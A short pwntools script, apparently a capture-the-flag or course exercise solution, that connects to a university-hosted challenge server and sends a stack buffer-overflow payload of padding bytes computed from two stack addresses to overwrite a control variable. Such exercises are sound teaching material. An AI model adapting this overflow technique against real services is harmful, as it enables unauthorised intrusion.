#!/bin/python3.11

from pwn import *


# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9990)

buffer = 0xffffce5c
control = 0xffffce9c

offset = control - buffer

payload = b"A" * offset + b'1'
print(S.recvuntil(b"trol\n"))
S.sendline(payload)
print(S.recvall())
